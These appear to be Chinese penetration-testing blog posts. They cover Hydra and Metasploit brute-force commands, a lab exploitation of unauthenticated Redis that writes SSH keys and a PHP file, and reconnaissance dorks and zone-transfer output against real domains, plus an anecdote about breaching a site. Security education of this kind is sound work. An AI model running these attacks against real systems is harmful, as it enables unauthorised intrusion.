'csrftoken=zeS7KCvlVoiNMuxtdrjF77dC88sqib2J2nYf4alfeDwKeaSaEMDA5wFIH9yf8kyz; PHPSESSID=bqfflff6be4tgg69lfnv4g4ik4; security=high' &#125; username = sys.argv[1] password_path = sys.argv[2] try: with open(password_path, "r") as f: lines = ''.join(f.readlines()).split("\n") for password in lines: brute_with_token(username, password, headers) except Exception as e: print('文件读取异常') 脚本使用方法和效果： 123456789$ python brute.py admin pass.txt7e43d35b6c656afdf926a95a55d6252e:admin:Pass999...f6f9db1ba43dfd57288fb73159503652:admin:passwordBingo 爆破成功username:adminpassword:password 系统认证爆破国内常见弱口令： 爆破工具 Hydra 九头蛇https://github.com/vanhauser-thc/thc-hydra 1234567891011121314# FTP爆破hydra -L /root/user.txt -P /root/password.txt ftp://192.168.0.1 -vV# SSH 爆破hydra -L /root/user.txt -P /root/password.txt ssh://192.168.0.1 --vV# SMB 爆破hydra -l admin -P password.txt smb://10.211.55.9# MSSQL 爆破hydra -L /root/user.txt -P /root/password.txt 192.168.0.1 mssql -vV# MySQL 爆破hydra -L /root/user.txt -P /root/password.txt 192.168.0.1 mysql -vV SNETCrackerhttps://github.com/shack2/SNETCracker 超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查。 SSH登录发生异常！Could not load file or assembly ‘ChilkatDotNet4.dll’ or one of its dependencies. 找不到指定的模块。 这个错误是因为需要这个ssh模块需要vc++2010 32位得支持，下载安装就行了。RDP 错误一般是线程过多，一般建议最好在 10 个以内，自己慢慢试，线程多了就会出问题。 Metasploithttps://github.com/rapid7/metasploit-framework RAPID7 团队出品。Offensive Security 团队 12345show optionsset rhosts 10.20.xx.xxxset username adminset pass_file /Users/sec/Documents/Sec/hydra/password.txtrun 常见爆破思路爆破 21 FTPFTP（File Transfer Protocol，文件传输协议） 是TCP/IP 协议组中的协议之一。 hydra 指令： hydra -L user.txt -P password.txt ftp://127.0.0.1 msf 模块： 1use auxiliary/scanner/ftp/ftp_login 爆破 22 SSHSSH 为 Secure Shell 的缩写，是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。默认端口为 22 爆破前检测是否开启数据库外连，不要做无意义的爆破。 SSH 爆破 判断对方是否开启公私钥 hydra 指令hydra -L user.txt -P password.txt ssh://127.0.0.1 msf 模块： 1auxiliary/scanner/ssh/ssh_login 爆破 23 TelnetTelnet 协议是 Internet 远程登录服务的标准协议和主要方式。 msf 模块： 1msfuse auxiliary/scanner/telnet/telnet_login 超级弱口令工具和 Hydra 爆破 Telnet 不太行，尽量使用 MSF 爆破 Telnet 爆破 爆破 445 SMBSMB(Server Message Block) Windows协议族，用于文件和打印共享服务。 SMB 和 RDP 用户都是一样的能爆破SMB就不爆破RDP另外 SMB 爆破还与防火墙是否关闭有关系，总的来说 SMB 爆破首选 MSF hydra 指令： hydra -L user.txt -P password.txt smb://127.0.0.1 msf 模块： 1use auxiliary/scanner/smb/smb_login 爆破 SambaSamba 是种用来让 UNIX 系列的操作系统与微软 Windows 操作系统的 SMB 网络协议做链接的自由软件。 爆破 1433 MSSQLMSSQL 是指微软的 SQLServer 数据库，默认端口为 1433 ，默认最高权限用户为 sa ，拿到 sa 用户权限的话，基本可以顺利提权拿到系统权限。 msf 模块： 1use auxiliary/scanner/mssql/mssql_login 爆破 1521 OracleOracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。默认端口为 1521 端口，和其他数据库不同的是，爆破前得先爆破对应的 SID，不过 SID 很多都是默认的，可以使用 MSF 来进行爆破。 Metasploit 爆破 SIDmsf 模块： 1use auxiliary/scanner/oracle/sid_brut Metasploit 爆破 Oraclemsf 模块： 1use auxiliary/scanner/oracle/oracle_login 爆破 3306 MySQLMySQL 是一个关系型数据库管理系统，默认端口为 3306 爆破前检测是否开启数据库外连，不要做无意义的爆破。 hydra 指令： hydra -L user.txt -P password.txt mysql://127.0.0.1 msf 模块： 1use auxiliary/scanner/mysql/mysql_login 爆破 3389 RDP远程桌面协议 RDP （Remote Display Protocol ）是 Windows 的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到 Windows 计算机，默认端口为 3389 暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般 Windows 服务器陌默认账户为 administrator。此外如果对方服务器开启了 SMB 445 端口的话尽量优先爆破 SMB，因为 RDP 协议比较脆弱，经不起高速的爆破。 爆破 5432 PostgreSQLPostgreSQL 是一种对象-关系型数据库管理系统，默认端口为 5432 可以直接使用超级弱口令工具爆破也可以使用 Metasploit 来进行爆破。 msf 模块： 1use auxiliary/scanner/postgres/postgres_login 爆破 6379 RedisRedis 是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。默认端口为 6379 可以直接使用超级弱口令工具爆破也可以使用 Metasploit。 msf 模块： 1use auxiliary/scanner/redis/redis_login 爆破 8080 TomcatTomcat 是由 Apache 软件基金会属下Jakarta项目开发的 Servlet 容器，默认端口为 8080 可以使用 Burp 的 Basic 认证爆破也可以直接使用 MSF 的模块来进行爆破。Tomcat口令是用户名在/conf/tomcat-users.xml自定义配置的，容易出现弱口令，Tomcat口令泄露的话 很容易被getshell 所以需要加固口令。 msf 模块： 1use auxiliary/scanner/http/tomcat_mgr_login 爆破 27017 MongoDBMongoDB 是一个基于分布式文件存储的数据库，当配置成无验证时，存在未授权访问。默认端口为 27017 可以直接使用超级弱口令工具爆破也可以使用 Metasploit。 1use auxiliary/scanner/mongodb/mongodb_login 未授权访问未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。 未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。 Redis 未授权访问Redis 是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 Redis 因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行操作。 Windows 安装下载地址：https://github.com/microsoftarchive/redis/releases 打开一个 cmd 窗口 使用命令切换到 Redis 运行： 1redis-server.exe redis.windows.conf 后面的那个 redis.windows.conf 可以省略，如果省略，会启用默认的 一些基本的交互命令123456789101112# 切换到 Redis 目录下运行：redis-cli.exe -h 127.0.0.1 -p 6379# 查看Redis的相关信息127.0.0.1:6379&gt;info# SET 设置键值对测试127.0.0.1:6379&gt; SET X &quot;Tomorrow is a another day&quot;OK127.0.0.1:6379&gt; GET X&quot;Tomorrow is a another day&quot; Linux 编译安装下载地址：https://redis.io/download 1234567891011# 下载Rediswget http://download.redis.io/releases/redis-5.0.5.tar.gz# 解压tar zxvf redis-5.0.5..tar.gz# 到src目录下cd redis-5.0.5/src# 编译make 编译成功如下： make 完后 Redis 的 src 目录下会出现编译后的 Redis 服务程序 Redis-server ，还有用于测试的客户端程序 Redis-cli： 下面启动 Redis 服务: 12cd src./redis-server 注意这种方式启动 Redis 使用的是默认配置。也可以通过启动参数告诉 Redis 使用指定配置文件使用下面命令启动。redis.conf 是一个默认的配置文件。我们可以根据需要使用自己的配置文件。 启动 Redis 服务进程后，就可以使用测试客户端程序 redis-cli 和 Redis 服务交互了: 1234567root@kali-linux:~/redis-5.0.5/src# ./redis-cli -h 127.0.0.1 -p 6379127.0.0.1:6379&gt; SET y &quot;Linux Redis is Running&quot;OK127.0.0.1:6379&gt; GET y&quot;Linux Redis is Running&quot; Linux apt 安装在 Ubuntu 系统安装 Redis 可以使用以下命令： 1234567891011# 更新源$ sudo apt-get update# 安装redis$ sudo apt-get install redis-server# 启动redis$ redis-server# 测试连接$ redis-cli 未授权访问修改公私钥Redis 未授权访问在4.x/5.0.5以前版本下，我们可以使用 master/slave 模式加载远程模块，通过动态链接库的方式执行任意命令。 安装配置SSH首先受害者Redis的服务器配置好公司钥登录的情况下可以直接通过修改秘钥来直接登录到服务器： 1234567891011121314# 更新源apt update# 安装openssh-serverapt install openssh-server# 允许root远程登陆echo "PermitRootLogin yes" &gt;&gt; /etc/ssh/sshd_config# SSH开机自启systemctl enable sshd# 开启SSHsystemctl start sshd 配置公私钥ssh 公私钥 \n\n\n 换三行不然公私钥会乱码 1234567891011121314# 生成公私钥ssh-keygen# 到ssh公私钥放的文件夹cd /root/.ssh/# 将公钥的内容拷贝到authorized_keys文件中cat id_rsa.pub &gt;&gt; authorized_keys# 关闭密码登陆echo "PasswordAuthentication no" &gt;&gt; /etc/ssh/sshd_config# 重启ssh/etc/init.d/ssh restart 将id-rsa拷贝到自己的机器上，用于连接SSH使用。 客户端尝试公私钥登录: 12345# 将拷贝下来的私钥设置600权限chmod 600 ~/Downloads/id_rsa# 使用私钥登陆ssh -i ~/Downloads/id_rsa root@10.211.55.4 模拟真实攻击 攻击者 IP地址 macOS 本机 10.211.55.2 Kali Linux 虚拟机 10.211.55.4 Kali Linux虚拟机配置下Redis配置文件关闭 IP地址绑定： 123$ pwd/root/redis-5.0.5$ vim redis.conf 去掉ip绑定，允许除本地外的主机远程登录redis服务，需要注释掉如下内容： 1bind 127.0.0.1 关掉保护模式： 1protected-mode no 然后重启下Redis服务： 1./src/redis-server redis.conf 首先攻击者先本地生成一对公私钥： 1234567891011121314151617181920212223242526272829303132333435363738# 连接redis$ redis-cli -h 10.211.55.4 -p 6379# 查看当前路径10.211.55.4:6379&gt; config get dir1) "dir"2) "/root/redis-5.0.5"# 查看当前要操作的文件10.211.55.4:6379&gt; config get dbfilename1) "dbfilename"2) "dump.rdb"# 设置要操作的路径10.211.55.4:6379&gt; config set dir /root/.ssh/OK# 设置要操作的文件10.211.55.4:6379&gt; config set dbfilename authorized_keysOK# 查看设置好的路径10.211.55.4:6379&gt; config get dir1) "dir"2) "/root/.ssh"# 查案设置好的文件10.211.55.4:6379&gt; config get dbfilename1) "dbfilename"2) "authorized_keys"# 写入公钥的值10.211.55.4:6379&gt; set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDq1+O0Ht8S9iAdLE1btr0A14yR5dqS3mO9cWm5gasdYh+ZT31yZ+FoFo4IRZt+T7oliRgKO4krhmARpFmAj5B0C6Tv6N6js4lvdGBlV1AhPCnp2f+3mLZ+t97vUhF7pXXxdnu8759PJZ5IwjfVsRiCgnFY3p3eDY4kCl5nVqQm71MyaOX7FZwzsNvS3ZjP3tiy0drnVnr2QSrtKWSpuzxXApPupVS7HkcyuE9zbbckuo3cOMhFk8N9R0eIokALcXlvTXjqUwwQvU79F4D4YhFeDDovZp43mggSq4Oxsy/soL79XrIv2Hpv0cUUAEp1RDKyF3V1MH1O7fdyb63xd6R5 sqlsec@com\n\n\n"OK# 将公钥的值保存到要操作的文件10.211.55.4:6379&gt; saveOK SSH 登录验证： 未授权访问写入Webshell原理和写入SSH一样，首先 Kali Linux 开启 Apache： 123456# 启动 Apachesystemctl start apache2systemctl status apache2# 写入 info.php 测试echo '&lt;?php phpinfo();?&gt;' &gt; /var/www/html/info.php 然后浏览器访问：http://127.0.0.1/info.php 查看是否生效。 123456789101112131415# 操作目录10.211.55.4:6379&gt; config set dir /var/www/html/OK# 操作文件10.211.55.4:6379&gt; config set dbfilename shell.phpOK# 设置数据10.211.55.4:6379&gt; set x "&lt;?php phpinfo();?&gt;"OK# 写入数据10.211.55.4:6379&gt; saveOK 未授权访问弹 shellcrontab 定时任务Linux 下使用原生的 crontab 命令实现定时任务： 12345# 查看定时任务crontab -l# 编辑定时任务crontab -e 编辑定时任务，一行一个任务，填写的内容如下： 12# 分 时 日 月 星期 要运行的命令30 9 * * * /usr/bin/python3 /root/code/t00ls/TuBi.py&gt;&amp;1 表示每天 9:30 自动运行下面的命令： 1/usr/bin/python3 /root/code/t00ls/TuBi.py 这样看起来是不是很简单呢，如果语法没有问题的话，会得到如下提示： 1crontab: installing new crontab 这表示新建定时任务成功。 crontab 实例实例1：每 1 分钟执行一次 myCommand 1* * * * * myCommand 实例2：每小时的第 3 和第 15 分钟执行 13,15 * * * * myCommand 实例3：在上午 8 点到 11 点的第 3 和第 15 分钟执行 13,15 8-11 * * * myCommand 实例4：每隔两天的上午 8 点到 11 点的第 3 和第 15 分钟执行 13,15 8-11 */2 * * myCommand 实例5：每周一上午 8 点到 11 点的第 3 和第 15 分钟执行 13,15 8-11 * * 1 myCommand 实例6：每晚的21:30重启smb 130 21 * * * /etc/init.d/smb restart 实例7：每月1、10、22日的 4 : 45 重启smb 145 4 1,10,22 * * /etc/init.d/smb restart 实例8：每周六、周日的 1 : 10 重启 smb 110 1 * * 6,0 /etc/init.d/smb restart 实例9：每天 18 : 00 至 23 : 00 之间每隔 30 分钟重启smb 10,30 18-23 * * * /etc/init.d/smb restart 实例10：每星期六的晚上 23 : 00 重启smb 10 23 * * 6 /etc/init.d/smb restart 实例11：每一小时重启smb 1* */1 * * * /etc/init.d/smb restart 实例12：晚上11点到早上7点之间，每隔一小时重启smb 10 23-7 * * * /etc/init.d/smb restart 关于 /etc/crontab 及 /var/spool/cron/crontabs/$USER 中定义的定时任务 /etc/crontab 只有 root 用户可以使用，使用时需root权限，而且必须指定运行用户，才会执行： 1* * * * * root myCommand /var/spool/cron/$USER 所有用户都可以使用，可以使用 crontab -u username -e 命令来直接编辑这个文件： 1* * * * * myCommand Kali 的 shell 下有点问题，Ubuntu 16.10 已将先前默认的 bashshell 更换为了 dashshell。Debian 和 Ubuntu中，/bin/sh 默认已经指向 dash，这是一个不同于 bash 的 shell，它主要是为了执行脚本而出现，而不是交互，它速度更快，但功能相比bash要少很多，语法严格遵守POSIX标准。因为缺少了binbash的交互特性，所以kali中弹不回shell可以得到很好的解释了。 1ln -fs /bin/bash /bin/sh nc 命令教程https://www.sqlsec.com/2019/10/nc.html nc 被誉为网络安全界的瑞士军刀，一个简单而有用的工具，透过使用 TCP 或 UDP 协议的网络连接去读写数据。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集]]></title>
    <url>%2F%2F2020%2F08%2F312e3d12.html</url>
    <content type="text"><![CDATA[信息收集技术在渗透测试过程中，第一步就是进行信息收集，信息收集的过程，很多人将其写成了工具、脚本，于是我们就有了很多指纹识别工具、敏感文件、目录扫描工具，敏感信息探测工具，信息收集工具等等。很多前辈也都曾经说过：”渗透测试的本质就是信息收集” 信息收集介绍常规收集 备份文件泄露 接口泄露(小米主题商店接口信息泄露开发者敏感信息（身份证、手机等） 从信息泄露到未授权访问 端口扫描与目录扫描端口多扫几个 内网收集 内网服务器邮箱记录 浏览器保存密码记录 ESXI 认证Vcenter 可以尝试勾选启用windows登录认证 信息收集的方式可以分为两种：主动和被动。 主动的信息收集方式： 通过直接访问、扫描网站，这种将流量流经网站的行为。 被动的信息收集方式： 利用第三方服务和互联网信息进行收集。 被动信息收集（OSINT）Google Hack在渗透测试过程中第一步就是信息收集，由于传统的信息收集工具包括指纹识别、目录扫描器等会留下痕迹，某些情况下还会被拦截，因此，能否在不惊动目标服务器的情况下，对目标网站进行前期最重要的信息收集，并且尽可能的获得更多的信息呢？ 默认搜索搜索引擎基本语法，直接在搜索框中输入搜索词时，谷歌默认进行模糊搜索，并能对长短语或语句进行自动拆分成小的词进行搜索。 通配符谷歌的通配符是星号 *，用通配符代替关键词或短语中无法确定的字词。 逻辑非排除某个搜索结果：渗透测试 -习近平 百度无广告 常用关键词 关键词 说明 site 指定域名 intext 正文中存在关键词的网页 intitle 标题中存在关键词的网页 inurl URL中存在关键词的网页 filetype 搜索指定文件类型 常见后台查找12345intitle:后台登录inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cmsintext:管理|后台|登陆|用户名|密码|系统|帐号 实际演示搜索南京政府的子域名信息1site:nanjing.gov.cn 搜索互联网上的登录入口1intitle:登录 搜索百度的相关登录入口1intitle:登录 site:baidu.com -zhidao.baidu.com -baike.baidu.com -jingyan.baidu.com 查找互联网敏感文件12filetype:mdb|doc|xlsx|pdf密码 filetype:xls 查找被黑政府站点12北京赛车 inurl:gov.cnintitle:北京赛车 inurl:gov.cn 物联网搜索引擎Shodanhttps://www.shodan.io 物联网搜索引擎，是互联网上最可怕的搜索引擎，搜索所有和互联网关联的服务器、摄像头、打印机、路由器等等。 基本语法 关键词 说明 net 搜索指定ip地址或者子网，c段 hostname 搜索指定的域名或者服务器 port 搜索开放指定端口的设备 org 搜索属于指定组织或者公司的设备 product 搜索运行指定产品或者软件操作系统的设备 version 指定软件的版本 isp 搜索指定isp供应商的设备 country 搜索指定国家的设备 city 搜索指定城市的设备 语句之间可以相互组合使用，可以运用自己的思维，相互组合成自己需要的搜索语句 实际操作查找位于国内的 Nginx 服务器1nginx country:cn 搜索位南京开启 3389 端口的服务器12port:3389 city:nanjingport:3389 os:&quot;windows 10&quot; 搜索海康威视摄像头1Hikvision-Webs country:cn city:nanjing 查看Cisco思科设备全球分布12isp:ciscoisp:cisco country:cn 查看华为设备全球分布1isp:huawei windows口令必须大小写后，弱口令TOP：P@ssw0rd 实用技巧Shodan 实用技巧，查找互相关联的网站： 1234567import mmh3import requestsresponse = requests.get(&apos;https://www.baidu.com/favicon.ico&apos;)favicon = response.content.encode(&apos;base64&apos;)hash = mmh3.hash(favicon)print(hash) 计算出的 hash 用如下语法来反查： 1http.favicon.hash：hash 查找出类似模板的IP地址：http://111.231.41.219/ 查看原始数据 Ctrl+F 搜索 favicon 根据hash值反差： 1http.favicon.hash:-865290023 找同模板网站：看是不是一个logo/favicon 用小米logo的hash值反查 研究院真实案例分享 目标黄色网站 - 拿不下 - 找到同模板的网站 - 爆破 - 进入系统 - 通用漏洞 getshell - 拿到源码 - 代码审计 - 发现漏洞 - 拿下目标网站 - getshell - 突破限制进内网 - 内网漫游拿下数据 Zoomeyehttps://www.zoomeye.org ZoomEye 中文名为“钟馗之眼”，它定位于网络空间搜索引擎，能对暴露在公网的主机设备及网站组件进行全方位搜索（只要有IP地址即可搜索到），发现其中的漏洞，揪 出网络中“藏着掖着的问题”。ZoomEye和Shodan的区别是ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。 主机搜索组件名称app: 组件名。 ver: 组件版本。 1app:”Apache httpd” ver:”2.2.16″ 端口port: 开放端口。 1port:3389 操作系统os: 操作系统。 1os:linux 服务service: 结果分析中的“服务名”字段。 1234# 公网路由器：service:routersetup# 公网摄像头：service:webcam 主机名hostname: 分析结果中的“主机名”字段。 1hostname:google.com 位置country: 国家或者地区代码。 city: 城市名称。 12345# 搜索美国的 Apache 服务器app:Apache country:US# 搜索英国的 Sendmail 服务器app:Sendmail country:UK IP 地址ip: 搜索一个指定的 IP 地址 12# Google 的公共 DNS 服务器ip:8.8.8.8 CIDRIP 的 CIDR 网段。 1cidr:8.8.8.8/24 Web应用搜索网站site:网站域名。 例子： 1site: baidu.com 标题title: 页面标题 1title:Nginx 关键词keywords: 定义的页面关键词。 1keywords:Nginx 描述desc: 定义的页面说明。 1desc:Nginx HTTP 头headers: HTTP 请求中的 Headers。 1headers:Server FQFAhttps://fofa.so FOFA是白帽汇推出的一款网络空间资产搜索引擎。 它能够帮助企业客户迅速进行网络资产匹配、加快后续工作进程。 例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。 基本语法直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索 title=”abc” 从标题中搜索abc标题中有北京的网站 1title=&quot;北京&quot; header=”abc” 从http头中搜索abcjboss服务器 1header=&quot;jboss&quot; body=”abc” 从html正文中搜索abc正文包含Hacked by 1body=&quot;Hacked by&quot; domain=”qq.com” 搜索根域名带有qq.com的网站1domain=&quot;qq.com&quot; host=”.gov.cn” 从url中搜索.gov.cn1host=&quot;.gov.cn&quot; 教育网站1host=&quot;.edu.cn&quot; port=”443” 查找对应443端口的资产1port=&quot;443&quot; ip=”1.1.1.1” 搜索ip信息139.98.209.64 protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)1protocol=&quot;https&quot; 搜索指定城市的资产1city=&quot;Beijing&quot; 搜索指定行政区的资产1region=&quot;Zhejiang&quot; 搜索指定国家(编码)的资产1country=&quot;CN&quot; 搜索证书(https或者imaps等)中带有google的资产1cert=&quot;google&quot; 搜索FTP协议中带有users文本的资产1banner=users &amp;&amp; protocol=ftp 搜索所有协议资产，支持subdomain和service两种1type=service 搜索Windows资产1os=windows 搜索IIS 7.5服务器1server==&quot;Microsoft-IIS/7.5&quot; 搜索海康威视设备1app=&quot;海康威视-视频监控&quot; 时间范围段搜索1after=&quot;2017&quot; &amp;&amp; before=&quot;2017-10-01&quot; 搜索指定org(组织)的资产1org=&quot;Amazon.com, Inc.&quot; 搜索指定udp协议的资产1base_protocol=&quot;udp&quot; 高级搜索可以使用括号 和 &amp;&amp; || !=等符号，如 12345title=&quot;powered by&quot; &amp;&amp; title!=discuztitle!=&quot;powered by&quot; &amp;&amp; body=discuz( body=&quot;content=\&quot;WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) ) &amp;&amp; host=&quot;gov.cn&quot; 规则探索与发现https://fofa.so/subject https://fofa.so/library 子域名收集域名爆破是指使用爆破字段拼接主域名尝试访问，暴力破解出主域名下是否还有其他子域名。 例如通过某公司官网的主域名，可以暴力破解出该公司内部系统（如OA、CRM等等）的访问地址。 爆破在线爆破工具phpinfo.me/domain 本地工具爆破subDomainsBrutehttps://github.com/lijiejie/subDomainsBrute 每秒可扫描3000个域名 Layer 子域名挖掘机 法师经典作品，操作简单容易上手 https://github.com/euphrat1ca/LayerDomainFinder API搜索引擎site: domain OneForAll👊 OneForAll是一款功能强大的子域收集工具 自己动手丰衣足食Django 编写 Web 漏洞扫描器挖坑记录： https://www.sqlsec.com/2020/05/webscan.html 域名探测功能发现比较流行的子域名探测功能 one for all 用的也是很多 API 接口，于是打算使用第三方服务来获取子域名，这样获取的速度会很快。 因为这些子域名是存入数据库的，所以也就顺便增加了域名监控功能，每次扫描可以统计出新增的域名数量。域名探测所使用的 6 个接口分别如下，大家也可以直接拿去使用，做好对应的数据提取就可以了： 123456789101112131415161718# 爱站https://baidurank.aizhan.com/baidu/&#123;domain&#125;/# 百度云观测http://ce.baidu.com/index/getRelatedSites?site_address=&#123;domain&#125;# hackertargethttps://api.hackertarget.com/hostsearch/?q=&#123;domain&#125;# IP138https://site.ip138.com/&#123;domain&#125;/domain.htm# crt.sh SSL 证书反查https://crt.sh/?q=%25.&#123;domain&#125;# 千寻url = &apos;https://www.dnsscan.cn/dns.html&apos;datas = &#123;&quot;ecmsfrom&quot;: &apos;8.8.8.8&apos;, &quot;show&quot;: &apos;none&apos;, &quot;keywords&quot;: domain&#125; API接口找子域名比爆破更好用的原因： 大厂SRC 2级往上子域名很多，用字典爆破难以成功 大厂会有WAF拦截 域名访问超时直接丢弃结果的，然后再获取网页标题，这个在实际的信息收集中比较实用的，一些 404 403 的资产可以跳过，减少无意义的浪费时间。 证书透明度(CT)是为了防止证书授权机构(CA)或者其他恶意人员伪造服务器证书而诞生的一个项目。 CT会要求CA将数字证书(SSL/TLS证书)公开并发布将颁发记录同步到日志服务器中。而日志服务器则会提供给用户一个查找某域名颁发的所有数字证书途径。数字证书中会包含子域名相关的信息。 DNS 域传送漏洞什么是DNSDNS(Domain Name System，域名管理系统) 是万维网 WWW 的重要基础。它建立在一个分布式数据库基础之上，在这个数据库里，保存了IP地址和域名的相互映射关系。 DNS服务器使用的TCP/UDP端口号是53。 最常用的DNS记录有以下几类： 记录类别 说明 A记录 IP 地址记录,记录一个域名对应的 IP 地址 AAAA 记录 IPv6 地址记录，记录一个域名对应的 IPv6 地址 CNAME 记录 别名记录，记录一个主机的别名 MX 记录 电子邮件交换记录，记录一个邮件域名对应的IP地址 NS 记录 域名服务器记录 ,记录该域名由哪台域名服务器解析 PTR 记录 反向记录，也即从 IP 地址到域名的一条记录 TXT 记录 记录域名的相关文本信息 nslookup 命令nslookup 命令的使用。仅使用该命令，就可完成 DNS 域传送的测试。 指定 DNS 查询域名的 IP 地址： 1234567~ nslookup www.sqlsec.com 114.114.114.114Server: 114.114.114.114Address: 114.114.114.114#53Non-authoritative answer:Name: www.sqlsec.comAddress: 121.196.37.183 查询域名所使用的 DNS 服务器： 1234567$ nslookup www.sqlsec.com -type=nsServer: 100.100.2.136Address: 100.100.2.136#53Non-authoritative answer:Name: www.sqlsec.comAddress: 121.196.37.183 验证一下看看，是否这个 DNS 服务器开启了 53 端口： 12345678910$ nmap 100.100.2.136Starting Nmap 6.40 ( http://nmap.org ) at 2020-07-25 14:32 CSTNmap scan report for 100.100.2.136Host is up (0.00028s latency).Not shown: 999 filtered portsPORT STATE SERVICE53/tcp open domainNmap done: 1 IP address (1 host up) scanned in 9.26 seconds 域传送漏洞DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。 Nslookup 命令检测： 1234567891011 # 查询解析此域名的dns服务器nslookup -type=ns xxx.xxx.cn# 进入交互nslookup # 指定dns服务器server dns.xxx.xx.cn# 列出域信息ls xxx.xxx.cn 详细案例的输出结果： 12345678910111213141516171819202122232425262728293031D:\&gt;nslookup默认服务器: public1.114dns.comAddress: 114.114.114.114&gt; server dns.nwpu.edu.cn默认服务器: dns.nwpu.edu.cnAddress: 202.117.80.2&gt; ls nwpu.edu.cn[dns.nwpu.edu.cn] nwpu.edu.cn. NS server = dns.nwpu.edu.cn nwpu.edu.cn. NS server = dns1.nwpu.edu.cn nwpu.edu.cn. NS server = dns2.nwpu.edu.cn nwpu.edu.cn. NS server = dns3.nwpu.edu.cn * A 222.24.192.99(... 省略大量的记录)npunecas NS server = webcomp.npunecas.nwpu.edu.cn webcomp.npunecas A 202.117.85.146 nwpu03 A 202.117.80.4 nwpudb2 A 222.24.210.149 poj A 192.168.0.248 portal A 61.150.43.10 portal1 A 222.24.192.31 portal2 A 222.24.192.32 rei A 202.117.85.10 saip NS server = saipserver.saip.nwpu.edu.cn saipserver.saip A 202.117.85.72 test A 222.24.192.29 yzb A 202.117.85.3 zsb A 202.117.87.130 zygx A 202.117.80.9 C段与旁站(渐渐没落)基础知识什么是 IP 地址IP 地址在网络中用于标识一个节点（或者网络设备的接口），一个IPv4地址有32位。 192. 168. 10. 1 11000000 10101000 00001010 00000001 IP地址在最底层运算的时候依然采用的是二进制的方式。 IP地址的类别0.0.0.0 - 255.255.255.255 一共有2的32次方个，因为数量很庞大，所以需要科学的管理。我们一般把IP地址划分为如下5个类别： 正常可以被我们使用的只有A、B、C类A 类 00000001 - 01111111 : 0 - 1270 是不合法的 IP 地址，所以范围从 1 开始，又因为 127 是一个比较特殊的地址，回环地址，所以 A 类的第一个 8 bit 的值范围为 1-126 B 类 10000000 - 10111111 : 128 - 191C 类 11000000 - 11011111 : 192 - 223所以在内网渗透中，遇到 10 开头的 IP 地址，一般我们称呼它为 A 类地址，172 开头的IP地址为 B 类地址，192 开头的IP地址为 C 类地址。 IP 地址的网络和主机部分IP 地址和我们实际生活中的地址类似： 浙江省杭州市滨江区西兴街道联慧街188号安恒大厦浙江省 | 杭州市 滨江区 西兴街道联慧街188号网络号 | 主机号所以在网络中间对于转发信息的设备来说，他们不关心主机号，所以路由是不关心主机部分的，先把信息送到目标网络区域，然后交给对于的网络区域的设备来处理。 所以一个 IP 地址为：10.1.1.1 ，那么 10.0.0.0 为这个 IP 地址的网络号，1.1.1 为这个 IP 地主的主机号。 网络掩码 网络掩码为 32 bits，与 IP 地址的位数是一样的 网络掩码在二进制的表示上是一堆连续的 1 后面接连续的 0 值为 1 的 bit 对应 IP 地址中的网络位；为 0 的 bit 对应 IP 地址中的主机位，以此来辅助我们识别一个 IP 地址中的网络与主机位 A 段 B 段 C 段黑客所说的C段是什么意思12192.168.1.1/24192.168.1.1 - 192.168.1.255 子网掩码的位数总共有 32 个, /24表示前 24 个为1，其它 8 位都是 0所以 B 段 可以用下面来进行表示： 12172.1.1.1/16172.1.1.1 - 172.1.255.255 A 段 可以用下面来进行表示： 1210.1.1.1/810.1.1.1 - 10.255.255.255 一般渗透测试中常用于 C 段探测，内网中会对 B 段进行探测扫描，A 段资产太庞大，探测成本太高。 多地 ping 原理：根据不同地区CDN加速提高响应速度，因此ip会不一样 必应接口(没落)在线查询http://www.bug8.me/bing/bing.php 在线网站使用必应接口查询 C 段和旁站很方便，但是速度方面有点欠缺 K8 C段旁注工具 6.0https://github.com/k8gege/K8tools K8 C 段旁注查询工具 V6.0，但是速度要比在线快很多，解压密码为：k8team 爱站https://dns.aizhan.com/ 数量上还是比较优势的，而且查询速度也会比较快。 Fofa获取到域名的 IP 地址之后，可以使用 Fofa 来反查域名： 1ip=&quot;119.23.84.105&quot; &amp;&amp; type=&quot;subdomain&quot; 工具更多适用于内网，因为外网基本上开放端口都比较少，而且带云 WAF。 HTTPScanhttps://github.com/zer0h/httpscan 12pip install IPypython httpscan.py 220.191.202.0/24 http端口查询+标题获取首先实用快速端口扫描工具： 然后提取出ip地址信息，再放到爱站里面取查询，这样可以得出一个最完整的c段信息。 当旁站不是CDN的时候，适用于内网，可以使用批量获取网页标题工具来进行查询： 服务器信息查询CDN 介绍CDN（Content Delivery 